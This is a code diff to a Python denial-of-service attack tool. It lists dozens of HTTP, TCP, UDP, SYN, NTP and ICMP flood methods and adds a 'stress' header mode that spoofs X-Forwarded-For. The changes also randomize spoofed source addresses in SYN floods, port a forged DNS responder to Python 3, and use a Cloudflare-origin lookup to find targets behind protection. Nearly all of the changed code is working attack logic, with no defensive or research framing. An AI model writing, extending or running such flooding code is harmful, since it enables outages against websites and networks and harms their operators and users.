@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
+l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB", "CAPB"]
 l4 = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP"]
 l3 = ["POD", "ICMP"]
 to = ["CFIP", "DNS", "PING", "CHECK", "DSTAT", "INFO"]
@@ -71,9 +71,6 @@ def start_attack(method, threads, event, socks_type):
         elif method == "cookie":
             for _ in range(threads):
                 threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
-        elif method == "tor":
-            for _ in range(threads):
-                threading.Thread(target=tor, args=(event, socks_type), daemon=True).start()
         elif method == "bypass":
             for _ in range(threads):
                 threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
@@ -193,7 +190,16 @@ def Headers(method):
         useragent = "User-Agent: " + UserAgent + "\r\n"
         header = useragent + more + accept + up + "\r\n\r\n"
     elif method == "pps":
-        header = "GET / HTTP/1.1\r\n\r\n"
+        header = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
+    elif method == "stress":
+        connection = "Connection: Keep-Alive\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = referer + useragent + accept + connection + "\r\n\r\n"
     elif method == "dyn":
         connection = "Connection: Keep-Alive\r\n"
         accept = Choice(acceptall) + "\r\n"
@@ -357,6 +363,7 @@ def vse(event, timer):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     while time.time() < timer:
         try:
+            data = random._urandom(int(Intn(1024, 60000)))
             address = (str(target), int(port))
             try:
                 s.connect(address)
@@ -370,37 +377,26 @@ class DNSQuery:
     def __init__(self, data):
         self.data = data
         self.dominio = ''
-        self.DnsType = ''
+        self.DnsType = {"0001": "A", "000f": "MX", "0002": "NS", "0010": "TXT"}.get(data[-4:-2].hex(), "Unknown")
 
-        HDNS=data[-4:-2].encode("hex")
-        if HDNS == "0001":
-            self.DnsType='A'
-        elif HDNS == "000f":
-            self.DnsType='MX'
-        elif HDNS == "0002":
-            self.DnsType='NS'
-        elif HDNS == "0010":
-            self.DnsType="TXT"
-        else:
-            self.DnsType="Unknown"
-
-        tipo = (ord(data[2]) >> 3) & 15   # Opcode bits
-        if tipo == 0:                     # Standard query
-            ini=12
-            lon=ord(data[ini])
+        tipo = (data[2] >> 3) & 15   # Opcode bits
+        if tipo == 0:                # Standard query
+            ini = 12
+            lon = data[ini]
             while lon != 0:
-                self.dominio+=data[ini+1:ini+lon+1]+'.'
-                ini+=lon+1
-                lon=ord(data[ini])
+                self.dominio += data[ini+1:ini+lon+1].decode('latin1') + '.'
+                ini += lon + 1
+                lon = data[ini]
+
     def respuesta(self, ip):
-        packet=''
+        packet = b''
         if self.dominio:
-            packet+=self.data[:2] + "\x81\x80"
-            packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Questions and Answers Counts
-            packet+=self.data[12:]                                         # Original Domain Name Question
-            packet+='\xc0\x0c'                                             # Pointer to domain name
-            packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
-            packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
+            packet += self.data[:2] + b"\x81\x80"
+            packet += self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'   # Questions and Answers Counts
+            packet += self.data[12:]                                           # Original Domain Name Question
+            packet += b'\xc0\x0c'                                              # Pointer to domain name
+            packet += b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'              # Response type, ttl, rdlength
+            packet += bytes(int(x) for x in ip.split('.'))                     # 4 bytes of IP
         return packet
 
 def dns(event, timer):
@@ -421,7 +417,7 @@ def syn(event, timer):
     while time.time() < timer:
         try:
             IP_Packet = IP ()
-            IP_Packet.src = randomIP()
+            IP_Packet.src = spoofer()
             IP_Packet.dst = target
 
             TCP_Packet = TCP ()
@@ -933,7 +929,7 @@ def hit(event, timer):
 
 
 def cfbc(event, socks_type):
-    request = Headers("cfb")
+    request = Headers("get")
     event.wait()
     while time.time() < timer:
         try:
@@ -1367,6 +1363,13 @@ def main():
         makefile(out_file)
 
     if method == "check":
+        choice = str(sys.argv[3]).strip()
+        if choice == "4":
+            socks_type = 4
+        elif choice == "1":
+            socks_type = 1
+        else:
+            socks_type = 5
         proxydl(out_file, socks_type)
         exit()
     if method == "stop":
@@ -1375,8 +1378,6 @@ def main():
         stop()
     elif (method == "help") or (method == "h"):
         usge()
-    elif (method == "check"):
-        pass
     elif str(method.upper()) not in str(methods):
         print("method not found")
         exit()
@@ -1532,7 +1533,7 @@ def tools():
             piger(domain)
         elif tool == "dstat":
             address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
-            print('now please attack to {address}')
+            print(f'now please attack to {address}')
             os.system('dstat')
         else:
             print('tool not found')
@@ -1545,7 +1546,7 @@ def cfip(domain):
     if str("http") in str(domain):
         domain = domain.replace('https://', '').replace('http:', '').replace('/', '')
     URL = "http://www.crimeflare.org:82/cgi-bin/cfsearch.cgi"
-    r = requests.post(URL, data={"cfS": {domain}}, headers={"User-Agent": UserAgent, }, timeout=1)
+    r = requests.post(URL, data={"cfS": domain}, headers={"User-Agent": UserAgent, }, timeout=1)
     print(r.text)
 
 
@@ -1703,7 +1704,7 @@ def makefile(text):
     print(f'{lcy}[{green_color}-{lcy}] {white_color}File : {green_color}{text}')
 
 if __name__ == '__main__':
-    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cloudscraper, re
+    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cloudscraper, re, secrets
     from time import sleep
     from icmplib import ping as pig
     from scapy.layers.inet import TCP
